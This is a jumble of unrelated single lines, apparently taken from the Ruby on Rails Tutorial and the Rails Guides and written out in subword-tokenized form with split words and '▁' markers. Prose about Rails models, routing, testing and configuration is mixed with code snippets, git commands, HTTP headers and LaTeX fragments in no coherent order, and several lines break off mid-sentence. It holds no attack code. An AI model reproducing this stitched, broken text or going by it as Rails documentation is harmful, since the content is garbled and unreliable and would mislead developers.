▁ Go ▁a head ▁and ▁try ▁to ▁create ▁a ▁new ▁article ▖
▁ Transfer - Encoding : ▁ ch un k ed
▁would ▁try ▁to ▁create ▁the ▁symbol ▁\ k ode { : data - turbolinks - track }, ▁which ▁( it ▁turn s ▁out ) ▁is ▁invalid ▁because ▁of ▁the ▁hyphen s .
▁( B y ▁the ▁way , ▁under ▁the ▁h ood ▁Ruby ▁actually ▁evaluate s ▁the ▁expression ▁\ text tt {@ foo ▁|| ▁@ foo ▁= ▁" bar " }, ▁which ▁avoid s ▁an ▁unnecessary ▁assignment ▁when ▁\ text tt {@ foo } ▁is ▁\ text tt { nil } ▁or ▁\ text tt { false } .
▁$ ▁git ▁push ▁ origin ▁branch _ name
▁ Adding ▁this ▁to ▁the ▁Sessions ▁controller ' s ▁\ k ode { create } ▁method ▁lead s ▁to ▁the ▁a ma z ing ly ▁ compact ▁code ▁show n ▁in ▁Listing ~\ ref { code : remember _ me _ ternary } .
▁This ▁means ▁that ▁if ▁the ▁strings ▁are ▁of ▁different ▁length s , ▁and ▁the ▁strings ▁are ▁equal ▁when ▁compar ed ▁up ▁to ▁the ▁short est ▁length , ▁then ▁the ▁longer ▁string ▁is ▁consider ed ▁of ▁high er ▁ le x ical ▁precedence ▁than ▁the ▁short er ▁one ▖
▁* ▁Set s ▁server ▁specific ▁X - Sendfile ▁header ▖
▁ _ ' no sniff ' ▁in ▁Rails ▁by ▁default _ ▁- ▁stop s ▁the ▁browser ▁from ▁guess ing ▁the ▁ MIME ▁type ▁of ▁a ▁file .
▁There ' s ▁really ▁not h ing ▁to ▁be ▁done ▁about ▁this , ▁except ▁to ▁say , ▁`` Welcome ▁to ▁Ruby !''
▁As ▁a ▁next ▁step ▁ beyond ▁report ing ▁issues , ▁you ▁can ▁help ▁the ▁ core ▁team ▁re s ol ve ▁existing ▁issues ▖
▁T r ue ▁by ▁default ▁in ▁development ▁and ▁test ▁ environments , ▁and ▁false ▁in ▁production ▁mode ▖
▁The ▁method ▁` instance _ variable _ name s ` ▁returns ▁an ▁array ▖
▁* ▁`: o d d ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁an ▁ o d d ▁number ▁if ▁set ▁to ▁true ▖
▁tags ▁= ▁% w ( a ▁ acronym ▁b ▁ strong ▁i ▁ em ▁ li ▁ ul ▁ ol ▁h 1 ▁h 2 ▁h 3 ▁h 4 ▁h 5 ▁h 6 ▁block quot e ▁br ▁c ite ▁sub ▁ s up ▁in s ▁p )
▁ Make ▁sure ▁to ▁use ╼ string ▁keys ▁consistent ly .
▁( In de ed , ▁the ▁only ▁big ▁piece ▁of ▁software ▁we ' ll ▁install ▁separate ly ▁is ▁Rails ▁itself , ▁and ▁this ▁is ▁intention al ▁( Section ~\ ref { sec : installing _ rails })▖)
▁# ▁ SELECT ▁" articles " .
▁There ' s ▁also ▁` insert _ after ` ▁which ▁will ▁insert ▁a ▁middleware ▁after ▁another :
▁#### # ▁Specif y ing ▁Layouts ▁for ▁Controller s
▁Author : ▁ Michael ▁Hartl ▁< michael @ michael hartl ▖ com >
▁Microposts , ▁like ▁Users , ▁are ▁model ed ▁as ▁a ▁resource ▁back ed ▁by ▁an ▁Active ▁Record ▁model .
▁in ▁Listing ~\ ref { code : password _ reset _ expire _ test } .
▁### ▁S li c ing
▁A ▁ summary ▁of ▁the ▁default ▁Rails ▁files ▁appears ▁in ▁Table ~\ ref { table : rails _ directory _ structure } ; ▁we ' ll ▁learn ▁about ▁most ▁of ▁these ▁files ▁and ▁directories ▁throughout ▁the ▁rest ▁of ▁this ▁book .
▁We ▁will ▁also ▁make ▁separate ▁pages ▁to ▁show ▁the ▁user ▁following ▁and ▁followers ▁arrays .
▁- h ▁This ▁message
▁( A ▁third ▁technique , ▁\ emph { mixin s }, ▁is ▁introduce d ▁in ▁Section ~\ ref { sec : rails _ environments } ▖)
▁belongs _ to ▁: client , ▁ counter _ cache : ▁true
▁p adding : ▁2 p x ;
▁method _ name ▁= ▁" _ _ bind _ # { time ▖ to _ i } _ # { time ▖ u sec } "
▁A ▁string ▁of ▁followed ▁user ▁id s ▁then ▁appears ▁as ▁follows :
▁ Adding ▁some ▁debug ▁information ▁to ▁the ▁site ▁layout .
▁### ▁De p lo y ▁to ▁a ▁sub directory ▁( relative ▁url ▁root )
▁The ▁HTML ▁source ▁produce d ▁by ▁the ▁CSS ▁includes .
▁Note ▁that ▁` classify ` ▁returns ▁a ▁class ▁name ▁as ▁a ▁string ▖
▁* ▁` config ▖ autoload _ once _ paths ` ▁accept s ▁an ▁array ▁of ▁paths ▁from ▁which ▁Rails ▁will ▁ autoload ▁constant s ▁that ▁won ' t ▁be ▁ w ip ed ▁per ▁request ▖
▁config ▖ active _ record ▖ raise _ in _ transaction al _ callback s ▁= ▁true
▁With ▁these ▁views ▁defined , ▁the ▁Home , ▁Help , ▁and ▁About ▁pages ▁are ▁the ▁same ▁as ▁before , ▁but ▁they ▁have ▁much ▁less ▁duplication .
▁the ▁user ▁would ▁see ▁the ▁usage ▁message ▁ al ig n ed ▁again st ▁the ▁left ▁m ar g in .
▁Run ▁this ▁command ▁in ▁your ▁terminal :
▁The ▁site ▁layout ▁with ▁the ▁\ k ode { full \_ title } ▁helper ▖
▁[1, ▁2, ▁3 , ▁4 , ▁5 ]
▁ { | video | ▁ video ▖ category ▁== ▁params [: category ]}
▁ Helper ▁methods ▁that ▁are ▁used ▁in ▁multiple ▁fixtures ▁should ▁be ▁defined ▁on ▁module s ╼ include d ▁in ▁the ▁new ly ▁introduce d ▁` ActiveRecord :: Fi x t ure S e t ▖ con text _ class `, ▁in ╼` test _ helper ▖ rb ` .
▁end
▁A ▁mockup ▁of ▁the ▁ proto - feed ▁with ▁micropost ▁delete ▁links ▖ ~\ href { http :// railstutorial ▖ org / images / figures / micropost _ delete _ links _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁ W h y ▁do ▁we ▁need ▁associations ▁between ▁models ?
▁By ▁including ▁\ k ode { name : string } ▁and ▁\ k ode { email : string }, ▁we ▁have ▁arrange d ▁for ▁the ▁User ▁model ▁to ▁have ▁the ▁form ▁show n ▁in ▁Figure ~\ ref { fig : demo _ user _ model } .
▁ Most ▁of ▁the ▁idea s ▁in ▁Listing ~\ ref { code : password _ reset _ integration _ test } ▁have ▁appear ed ▁previous ly ▁in ▁this ▁tutorial ; ▁the ▁only ▁really ▁no ve l ▁element ▁is ▁the ▁test ▁of ▁the ▁\ k ode { input } ▁tag :
▁For ▁example , ▁` to ` ▁returns ▁the ▁sub array ▁of ▁elements ▁up ▁to ▁the ▁one ▁at ▁the ▁passed ▁index :
▁In ▁the ▁case ▁of ▁a ▁Rails ▁upgrade , ▁that ▁will ▁mean ▁every ▁single ▁piece ▁of ▁functionality ▁in ▁the ▁application ▖
▁### ▁Configur ing ▁Active ▁Support
▁For ▁to p - level ▁or ▁ anonymous ▁module s ▁` parent _ name ` ▁returns ▁` nil ` .
▁You ▁can ▁ connect ▁to ▁the ▁database ▁by ▁setting ▁an ▁environment ▁variable ▁` ENV [' DAT A BASE _ URL ']` ▁or ▁by ▁using ▁a ▁configuration ▁file ▁called ▁` config / database ▖ yml ` .
▁ Adding ▁the ▁Relationship ▁model ▁validations .
▁In ▁Rails ▁4 ▖ 2, ▁the ╼ invocation ▁of ▁the ▁instance ▁methods ▁are ▁def er r ed ▁un til ▁either ▁` deliver _ now ` ▁or ╼` deliver _ later ` ▁is ▁called ▖
▁in ▁Listing ~\ ref { code : user _ relationships _ association } .
▁console ▁do
▁We ▁start ▁with ▁the ▁page ▁to ▁show ▁all ▁the ▁users ▁in ▁our ▁application , ▁called ▁\ href { http :// localhost :3000/ users }{\ text tt { index } } ; ▁as ▁you ▁m ight ▁expect , ▁initially ▁there ▁are ▁no ▁users ▁at ▁all ▁( Figure ~\ ref { fig : demo _ blank _ user _ index _ rails _3} ) .
▁format ▖ text ▁ { ▁render ▁text : ▁' Render ▁text ' ▁ }
▁If ▁you ▁ still ▁need ▁the ▁feature ▁you ▁can ▁add ▁the ▁[ Active ▁Resource ▁gem ]( https :// github ▖ com / rails / active resource ) ▁in ▁your ▁Gemfile .
▁With ▁the ▁addition ▁of ▁the ▁status ▁feed , ▁we ' ve ▁ finished ▁the ▁sample ▁application ▁for ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } .
▁ Adding ▁microposts ▁to ▁the ▁user ▁\ k ode { show } ▁page .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : user _ create _ action }, ▁our ▁signup ▁form ▁is ▁actually ▁working , ▁but ▁before ▁ submitting ▁a ▁valid ▁ registration ▁in ▁a ▁browser ▁we ' re ▁going ▁to ▁add ▁a ▁bit ▁of ▁polish ▁common ▁in ▁web ▁applications : ▁a ▁message ▁that ▁appears ▁on ▁the ▁subsequent ▁page ▁( in ▁this ▁case , ▁we l com ing ▁our ▁new ▁user ▁to ▁the ▁application ) ▁and ▁then ▁disappear s ▁upon ▁visit ing ▁a ▁second ▁page ▁or ▁on ▁page ▁ reload .
▁The ▁two ▁share ▁a ▁common ▁` lib `╼ directory ▁structure , ▁and ▁are ▁both ▁generated ▁using ▁the ▁` rails ▁plugin ▁new `╼ generator ▖
▁raise ▁ ArgumentError , ▁" Regexp ▁ multiline ▁option ▁not ▁allow ed ▁in ▁routing ▁requirements : ▁# { require ment ▖ inspect } "
▁If ▁your ▁application ▁has ▁to ▁execute ▁commands ▁in ▁the ▁under ly ing ▁operat ing ▁system , ▁there ▁are ▁sever al ▁methods ▁in ▁Ruby : ▁exec ( command ), ▁ sy s call ( command ), ▁system ( command ) ▁and ▁` command ` ▖
▁We ▁solve d ▁a ▁similar ▁issue ▁with ▁secure ▁passwords ▁in ▁Section ~\ ref { sec : adding _ a _ secure _ password }, ▁which ▁pair ed ▁a ▁virtual ▁\ k ode { password } ▁attribute ▁with ▁a ▁secure ▁\ k ode { password \_ digest } ▁attribute ▁in ▁the ▁database .
▁Listing ~\ ref { code : valid _ user _ test } ▁uses ▁the ▁plain ▁\ k ode { assert } ▁method , ▁which ▁in ▁this ▁case ▁succeed s ▁if ▁\ k ode {@ user ▖ valid ?}\ ▁returns ▁\ k ode { true } ▁and ▁fails ▁if ▁it ▁returns ▁\ k ode { false } .
▁def ▁new
▁$ ▁rails ▁generate ▁scaffold ▁User ▁name : string ▁email : string
▁SQL ▁uses ▁the ▁` HA V IN G ` ▁clause ▁to ▁specify ▁conditions ▁on ▁the ▁` G R O U P ▁BY ` ▁fields ▖
▁In ▁other ▁words , ▁the ▁do t ▁\ k ode { ▖ } \ ▁in ▁\ k ode { ▖ center } ▁indicates ▁that ▁the ▁rule ▁style s ▁a ▁class .
▁< li >`: authentication ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁you ▁need ▁to ▁specify ▁the ▁authentication ▁type ▁here ▖
▁( You ▁may ▁see ▁some ▁ warning ▁messages , ▁which ▁you ▁should ▁ignore ▁for ▁now .
▁Before ▁implement ing ▁followed ▁users ▁and ▁followers , ▁we ▁first ▁need ▁to ▁es tab li sh ▁the ▁association ▁between ▁users ▁and ▁relationships .
▁The ▁fully ▁ refactored ▁user ▁index .
▁ Adding ▁the ▁User ▁model ▁\ k ode { following } ▁association .
▁This ▁way ▁you ▁can ▁switch ▁back ▁and ▁for th ▁between ▁the ▁topic ▁and ▁master ▁branch es , ▁m er g ing ▁in ▁changes ▁every ▁time ▁you ▁reach ▁a ▁natural ▁stop p ing ▁point .
▁NOTE : ▁ Error s ▁added ▁to ▁` record ▖ errors [: base ]` ▁ rel ate ▁to ▁the ▁state ▁of ▁the ▁record ╼ as ▁a ▁whole , ▁and ▁not ▁to ▁a ▁specific ▁attribute .
▁Client ▖ find _ by ▁first _ name : ▁' J on '
▁The ▁analogy ▁between ▁login , ▁remember ing , ▁account ▁activation , ▁and ▁password ▁reset .
▁* ▁`: is ` ▁- ▁The ▁attribute ▁length ▁must ▁be ▁equal ▁to ▁the ▁given ▁value .
▁#### # ▁` collection ▖ exists ? (▖▖▖)
▁TIP : ▁O b serv e ▁in ▁the ▁previous ▁example ▁that ▁con sec u tive ▁ separator s ▁result ▁in ▁empty ▁arrays .
▁Because ▁we ▁wrote ▁working ▁application ▁code ▁first , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁ Show ing ▁hidden ▁files ▁in ▁the ▁file ▁ navigator .
▁### ▁Creat ing ▁a ▁B ug ▁Re port
▁In ▁the ▁next ▁section , ▁you ▁will ▁add ▁the ▁ability ▁to ▁create ▁new ▁articles ▁in ▁your ╼ application ▁and ▁be ▁able ▁to ▁view ▁them ▖
▁< p > Welcome !
▁ Turbolinks ▁a tt a ch es ▁a ▁click ▁handle r ▁to ▁all ▁`< a >` ▁on ▁the ▁page ▖
▁B oo le an s
▁With ▁this ▁code , ▁the ▁browser ▁will ▁make ▁a ▁fresh ▁request ▁for ▁the ▁index ▁page , ▁the ▁code ▁in ▁the ▁` index ` ▁method ▁will ▁run , ▁and ▁all ▁will ▁be ▁well .
▁The ▁test ▁suite ▁run s ▁with ▁ warning s ▁enabled ▖
▁API ▁Documentation ▁G u ide lines
▁In ▁Section ~\ ref { sec : has _ secure _ password } ▁we ' ll ▁add ▁a ▁final ▁common ▁validation , ▁\ emph { confirmation } .
▁<%= ▁javascript _ include _ tag ▁" http :// example ▖ com / main ▖ js " ▁%>
▁in ▁\ line break ▁Listing ~\ ref { code : generalized _ authenticated _ p } .
▁module ▁B us in ess
▁There ' s ▁an ▁old ▁ j o k e ▁that ▁there ▁are ▁10 ▁kind s ▁of ▁people ▁in ▁the ▁world : ▁those ▁who ▁understand ▁bin ary ▁and ▁those ▁who ▁don ' t ▁( 10 , ▁of ▁course , ▁being ▁2 ▁in ▁bin ary ) .
▁An ▁ augment ed ▁\ k ode { ▖ gitignore } ▁file .
▁For ▁example , ▁given
▁If ▁any ▁of ▁these ▁save s ▁fails ▁due ▁to ▁validation ▁errors , ▁then ▁the ▁assignment ▁statement ▁returns ▁` false ` ▁and ▁the ▁assignment ▁itself ▁is ▁can ce ll ed .
▁The ▁valid ▁format s ▁consist ▁of ▁the ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / Internet _ media _ type } { MIME ▁types } ▁accepted ▁by ▁the ▁validation ▁in ▁Listing ~\ ref { code : validate _ picture _ format } .
▁To ▁get ▁the ▁test ▁to ▁pass , ▁we ▁have ▁to ▁configure ▁our ▁test ▁file ▁with ▁the ▁proper ▁domain ▁host , ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ domain _ host } .
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁"3"] , ▁[" 4 ", ▁"5" , ▁nil ] , ▁[" 6 ", ▁"7" , ▁nil ]]
▁self ▁: ▁ qualified _ const _ get ( mod _ name )
▁* ▁`: destroy `, ▁when ▁the ▁object ▁is ▁destroyed , ▁` destroy ` ▁will ▁be ▁called ▁on ▁its ╼ associated ▁objects .
▁generate (: scaffold , ▁" person ▁name : string ")
▁* ▁` config ▖ autoload _ paths ` ▁accept s ▁an ▁array ▁of ▁paths ▁from ▁which ▁Rails ▁will ▁ autoload ▁constant s ▖
▁If ▁people ▁are ▁encourag ing ▁you ▁to ▁t we a k ▁your ▁code , ▁then ▁it ' s ▁worth ▁making ▁the ▁t we a k s ▁and ▁re submitting ▖
▁You ▁can ▁make ▁subsequent ▁calls ▁to ▁the ▁store d ▁content ▁in ▁other ▁templates ▁or ▁the ▁layout ▁by ▁passing ▁the ▁identifie r ▁as ▁an ▁argument ▁to ▁` yield ` .
▁( If ▁instead ▁you ▁get ▁an ▁error ▁message ▁indicat ing ▁that ▁the ▁email ▁address ▁has ▁already ▁been ▁taken , ▁be ▁sure ▁to ▁run ▁the ▁\ k ode { db : migrate : reset } ▁Rake ▁task ▁as ▁indicate d ▁in ▁Section ~\ ref { sec : signup _ form } ▁and ▁restart ▁the ▁development ▁ webserver ▖)
▁This ▁association ▁indicates ▁that ▁each ▁instance ▁of ▁the ▁model ▁has ▁ zero ▁or ▁more ▁instance s ▁of ▁another ▁model ▖
▁The ▁\ k ode { div } ▁tag ▁is ▁a ▁generic ▁ div is ion ; ▁it ▁doesn ' t ▁do ▁anything ▁a part ▁from ▁ div ide ▁the ▁document ▁into ▁ distinct ▁parts .
▁create ▁Rake file
▁------------ --------------- ---------------
▁With ▁that , ▁we ' re ▁done ▁with ▁the ▁links ▁and ▁named ▁routes , ▁at ▁least ▁un til ▁we ▁add ▁a ▁route ▁for ▁logging ▁in ▁( Chapter ~\ ref { cha : basic _ login }) .
▁Action ▁View ▁Over view
▁* ▁` ActionDispatch :: Flash ` ▁set s ▁up ▁the ▁` flash ` ▁keys ▖
▁``` erb
▁F ing er print ing ▁fix es ▁these ▁problem s ▁by ▁avoid ing ▁query ▁strings , ▁and ▁by ▁ en s ur ing ╼ that ▁filename s ▁are ▁consistent ▁base d ▁on ▁their ▁content .
▁cache ▖ write ( join _ asset _ file _ content s ( asset _ paths ) )
▁* ▁`: less _ than ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁less ▁than ▁the ▁supplied ▁value ▖
▁Signup ▁confirmation
▁### ▁ Comm it ▁Your ▁Change s
▁Some ▁uses ▁of ▁\ k ode { assert \_ select } .
▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ activation _ to _ users _ migration } .
▁ / signin
▁The ▁generated ▁User ▁mailer .
▁We ▁saw ▁in ▁Section ~\ ref { sec : partial _ refactoring } ▁that ▁the ▁code
▁* ▁** Convention ▁Over ▁Configuration : ** ▁Rails ▁has ▁ o p in ion s ▁about ▁the ▁best ▁way ▁to ▁do ▁many ╼ ▁things ▁in ▁a ▁web ▁application , ▁and ▁defaults ▁to ▁this ▁set ▁of ▁convention s , ▁rather ▁than ╼ ▁require ▁that ▁you ▁specify ▁every ▁m in u t ia e ▁through ▁end less ▁configuration ▁files .
▁{" first _ name "=>" E ile en ", ▁" created _ at "=>" 2013 - 12 - 0 9 ▁ 11 : 22 : 3 5 ▖ 22 1 28 2 "}
▁It ' s ▁time ▁now ▁to ▁re visit ▁the ▁line ▁from ▁Listing ~\ ref { code : application _ layout _ redux } ▁used ▁in ▁the ▁layout ▁to ▁include ▁the ▁c ascad ing ▁style ▁ sheet s :
▁It ' s ▁possible ▁that ▁your ▁system ▁already ▁has ▁Ruby ▁installed .
▁The ▁result ing ▁ augment ed ▁data ▁model ▁for ▁microposts ▁appears ▁in ▁Figure ~\ ref { fig : micropost _ model _ image } .
▁application _ controller ▖ rb
▁The ▁comment ed - out ▁hint ▁for ▁defin ing ▁the ▁root ▁route .
▁( The y ' re ▁not ▁\ emph { valid } ▁either , ▁but ▁fixture ▁data ▁doesn ' t ▁get ▁run ▁through ▁the ▁validations ▖)
▁resources ▁: magazine s ▁do
▁Then ▁create ▁a ▁\ k ode { params } ▁hash ▁so ▁that ▁\ k ode { params [: fa the r ]} ▁is ▁\ k ode { person 1 }, ▁\ k ode { params [: m other ]} ▁is ▁\ k ode { person 2 }, ▁and ▁\ k ode { params [: child ]} ▁is ▁\ k ode { person 3 } .
▁( This ▁can ▁be ▁pa in ful ▁and ▁error - prone , ▁and ▁I ▁actually ▁d read ▁ having ▁to ▁install ▁new ▁versions ▁of ▁Ruby , ▁but ▁ u nfortunately ▁it ' s ▁the ▁ cost ▁of ▁doing ▁ business ▖)
▁The ▁ schema ▁ dump er ▁add s ▁one ▁ additional ▁configuration ▁option :
▁HTTP /1▖1 ▁ 400 ▁B ad ▁ Request
▁Buil d ing ▁forms ▁in ▁Rails ▁is ▁really ▁just ▁that ▁easy !
▁ dup [: b ] [: e ] ▁= ▁5
▁The ▁primary ▁operation ▁of ▁` Model ▖ find ( options ) ` ▁can ▁be ▁summariz ed ▁as :
▁A lthough ▁the ▁exact ▁version ▁number s ▁and ▁details ▁may ▁differ ▁slightly , ▁the ▁results ▁should ▁look ▁something ▁like ▁Figure ~\ ref { fig : cloud 9 _ gemfile } ▁and ▁Listing ~\ ref { code : default _ gemfile } .
▁This ▁migration ▁will ▁need ▁to ▁be ▁run ▁on ▁the ▁application ▖
▁S el ec t ▁`` Create ▁ New ▁Work space ''
▁ ╼ ▁$ ▁rails ▁console ╼ ▁> > ▁x ▁= ▁1 ╼ ▁=> ▁1 ╼ ▁> > ▁x ▁ += ▁1 ╼ ▁=> ▁2 ╼ ▁> > ▁x ▁* = ▁3 ╼ ▁=> ▁6 ╼ ▁> > ▁x ▁- = ▁ 8 ╼ ▁=> ▁- 2 ╼ ▁> > ▁x ▁ / = ▁2 ╼ ▁=> ▁- 1
▁Using ▁a ▁high ▁ cost ▁make s ▁it ▁ com put ation ally ▁in tr ac table ▁to ▁use ▁the ▁hash ▁to ▁determine ▁the ▁original ▁password , ▁which ▁is ▁an ▁important ▁security ▁pre c a u tion ▁in ▁a ▁production ▁environment , ▁but ▁in ▁tests ▁we ▁want ▁the ▁\ k ode { digest } ▁method ▁to ▁be ▁as ▁ fast ▁as ▁possible .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : image _ uploader _ resizing }
▁By ▁convention , ▁each ▁action ▁also ▁map s ▁to ▁particular ▁ CRUD ▁operations ▁in ▁a ▁database ▖
▁Oh ▁& hell ip ; "
▁This ▁method ▁validates ▁that ▁a ▁checkbox ▁on ▁the ▁user ▁interface ▁was ▁check ed ▁when ▁a ╼ form ▁was ▁submitted ▖
▁That ' s ▁like ▁` Date ▖ today `, ▁except ▁that ▁it ▁h on or s ▁the ▁user ▁time ▁ zone , ▁if ▁defined ▖
▁ umerate }╼╼ ▁% ▁subsection ▁user _ index ▁( end )╼╼ ▁\ subsection { Sample ▁users } ▁% ▁( fold )╼ ▁\ label { sec : sample _ users }╼╼
▁The ▁console ▁ print s ▁the ▁result ▁of ▁evaluat ing ▁each ▁line , ▁which ▁in ▁the ▁case ▁of ▁a ▁string ▁literal ▁is ▁just ▁the ▁string ▁itself .
▁Ruby , ▁like ▁many ▁other ▁languages ▁( including ▁C / C + + , ▁ Perl , ▁P H P , ▁and ▁ Java ), ▁allows ▁you ▁to ▁replace ▁this ▁with ▁a ▁much ▁more ▁ compact ▁expression ▁using ▁the ▁\ emph { ternary ▁operator } ▁( so ▁called ▁because ▁it ▁consist s ▁of ▁three ▁parts ) :
▁class ▁Author ▁< ▁ActiveRecord :: Base
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁Because ▁the ▁association ▁is ▁called ▁` author `, ▁there ▁should ▁be ▁an ╼` author _ id ` ▁column ▁added ▁to ▁the ▁` blorgh _ articles ` ▁table .
▁$ ▁git ▁commit ▁- a
▁Return s ▁a ▁select ▁tag ▁with ▁options ▁for ▁each ▁of ▁the ▁day s ▁1 ▁through ▁31 ▁with ▁the ▁current ▁day ▁select ed .
▁#### # ▁`: foreign _ key `
▁ ╼ ▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁If ▁you ▁just ▁need ▁to ▁ lo o p ▁over ▁a ▁t housand ▁records ▁the ▁regular ▁find ▁methods ▁are ▁the ▁preferred ▁option .
▁If ▁you ▁run ▁into ▁trouble , ▁try ▁running
▁` errors [ ]` ▁is ▁used ▁when ▁you ▁want ▁to ▁check ▁the ▁error ▁messages ▁for ▁a ▁specific ▁attribute ▖
▁use ▁ ActionDispatch :: Re m o te I p
▁javascript _ include _ tag ▁: all , ▁cache : ▁true ▁# ▁=>
▁before _ save ▁ { ▁false ▁ } ▁# ▁G O O D
▁In ▁this ▁ s p ir it , ▁we ▁can ▁say ▁that ▁there ▁are ▁10 ▁kind s ▁of ▁people ▁in ▁the ▁world : ▁those ▁who ▁like ▁the ▁ ternary ▁operator , ▁those ▁who ▁don ' t , ▁and ▁those ▁who ▁don ' t ▁yet ▁know ▁about ▁it .
▁The ▁default ▁Rails ▁page ▁served ▁by ▁\ text tt { rails ▁server } .
▁Call s ▁to ▁normal ▁routing ▁methods ▁such ▁as ▁` articles _ path ` ▁may ▁end ▁up ╼ g o ing ▁to ▁un de s ir ed ▁location s ▁if ▁both ▁the ▁application ▁and ▁the ▁engine ▁have ▁such ▁a ╼ helper ▁defined .
▁But ▁first , ▁we ' ll ▁create ▁the ▁class ▁of ▁ administrative ▁users ▁ authorize d ▁to ▁do ▁so .
▁The ▁full ▁file ▁is ▁in ▁Listing ~\ ref { code : layout _ new _ structure } ; ▁ explanation s ▁for ▁the ▁ various ▁pieces ▁follow ▁immediately ▁there after .
▁Defaults ▁to ▁all ▁ locale ▁keys ▁found ▁in ▁ locale ▁files , ▁usually ▁only ▁`: en ` ▁on ▁a ▁new ▁application .
▁create ▁app / views / layouts / mailer ▖ text ▖ erb
▁Defaults ▁to ▁` nil ` .
▁In ▁this ▁case , ▁we ▁use ▁a ▁syntax ▁that ▁allows ▁us ▁to ▁test ▁for ▁the ▁presence ▁of ▁a ▁particular ▁link - - URL ▁combination ▁by ▁specify ing ▁the ▁tag ▁name ~\ k ode { a } ▁and ▁attribute ~\ k ode { href }, ▁as ▁in
▁ paintIt ( this , ▁ backgroundColor , ▁textColor )
▁You ▁can ▁also ▁click ▁on ▁the ▁ _ About ▁your ▁application ' s ▁environment _ ▁link ▁to ╼ see ▁a ▁ summary ▁of ▁your ▁application ' s ▁environment .
▁This ▁validation ▁will ▁work ▁with ▁all ▁of ▁the ▁association ▁types .
▁as ▁a ▁ safety ▁check ▁to ▁catch ▁any ▁errors ▁should ▁the ▁\ k ode { to \_ a } ▁ever ▁be ▁accidental ly ▁removed .
▁De pending ▁on ▁the ▁length ▁of ▁your ▁repository ' s ▁log ▁ history , ▁you ▁may ▁have ▁to ▁type ▁\ k ode { q } ▁to ▁ q u it .
▁F e t ch ing ▁source ▁index ▁for ▁ https :// rubygems ▖ org /
▁# ▁Generate ▁digest s ▁for ▁assets ▁URLs ▖
▁Recall ▁from ▁Section ~\ ref { sec : a _ users _ resource } ▁that ▁the ▁REST ▁architecture ▁involve s ▁\ emph { resources } ▁that ▁are ▁created ▁and ▁destroyed .
▁As ▁in ▁previous ▁migrations , ▁we ' ve ▁used ▁a ▁migration ▁name ▁that ▁end s ▁in ▁\ k ode { \_ to \_ users } ▁to ▁tell ▁Rails ▁that ▁the ▁migration ▁is ▁design ed ▁to ▁alter ▁the ▁\ k ode { users } ▁table ▁in ▁the ▁database .
▁The ▁method ▁` dasherize ` ▁replace s ▁the ▁ underscore s ▁in ▁the ▁receiver ▁with ▁d a sh es :
▁m attr _ accessor ▁: author _ class
▁In ▁the ▁examples ▁above ▁we ' ve ▁seen ▁" contributor " ▁and ▁" object "▖
▁U nfortunately , ▁the ▁result ing ▁page ▁is ▁an ▁error ; ▁as ▁of ▁Rails ~4▖0 , ▁for ▁technical ▁reason s ▁the ▁default ▁Rails ▁page ▁doesn ' t ▁work ▁on ▁Heroku .
▁To ▁ begin ▁our ▁testing ▁c y c le , ▁we ▁need ▁to ▁run ▁our ▁test ▁suite ▁to ▁verify ▁that ▁the ▁tests ▁current ly ▁pass .
▁You ▁may ▁won d er ▁why ▁we ▁use ▁both ▁the ▁\ k ode { footer } ▁tag ▁and ▁\ k ode { ▖ footer } ▁class .
▁* ▁Active ▁Record ▁ schema ▁naming ▁convention s .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : password _ reset _ form }
▁# ▁Un comment ▁these ▁lines ▁on ▁ Linux .
▁# ▁Return s ▁the ▁hash ▁digest ▁of ▁the ▁given ▁string .
▁d ▖ beginning _ of _ week (: sunday ) ▁# ▁=> ▁Sun , ▁ 02 ▁May ▁2010
▁### ▁` in ?
▁Person ▖ new ▖ valid ?
▁will ▁recognize ▁in com ing ▁paths ▁beginning ▁with ▁` / photos ` ▁but ▁route ▁to ▁the ▁` Image s ` ▁controller :
▁This ▁applies ▁only ▁to ▁temporary ▁sessions ▁in it ia ted ▁with ▁the ▁\ k ode { session } ▁method , ▁though , ▁and ▁is ▁\ emph { not } ▁the ▁case ▁for ▁ persistent ▁sessions ▁created ▁using ▁the ▁\ k ode { cookies } ▁method .
▁Create s ▁a ▁password ▁field , ▁a ▁m as k ed ▁text ▁field ▁that ▁will ▁h ide ▁the ▁users ▁input ▁ behind ▁a ▁m as k ▁character .
▁The ▁` re where ` ▁method ▁override s ▁an ▁existing , ▁named ▁where ▁ condition ▖
▁In ▁the ▁case ▁of ▁Listing ~\ ref { code : users _ migration }, ▁\ k ode { change } ▁uses ▁a ▁Rails ▁method ▁called ▁\ k ode { create \_ table } ▁to ▁create ▁a ▁table ▁in ▁the ▁database ▁for ▁storing ▁users .
▁The ▁key ▁in ▁this ▁case ▁is ▁the ▁powerful ▁\ k ode { send } ▁method , ▁which ▁let s ▁us ▁call ▁a ▁method ▁with ▁a ▁name ▁of ▁our ▁choice ▁by ▁`` send ing ▁a ▁message '' ▁to ▁a ▁given ▁object .
▁The ▁S an it ize Helper ▁module ▁provides ▁a ▁set ▁of ▁methods ▁for ▁ s c r ub b ing ▁text ▁of ▁un de s ir ed ▁HTML ▁elements .
▁@ customer ▁= ▁@ order ▖ customer
▁* ▁` bootstrap _ hook ` ▁Run s ▁all ▁configured ▁` before _ initialize ` ▁blocks .
▁Rails ▁correct s ▁this ▁error ▁by ▁writing ▁`` ref er r er '' ▁instead .
▁ Template s , ▁ Partial s ▁and ▁Layouts
▁#### ▁collection _ radio _ button s
▁Article ▖ includes (: category , ▁: comments )
▁options ▖ update ( options [: params ] ▖ symbolize _ keys ) ▁if ▁options [: params ]
▁" contact _ data "▖ dasherize ▁# ▁=> ▁" contact - data "
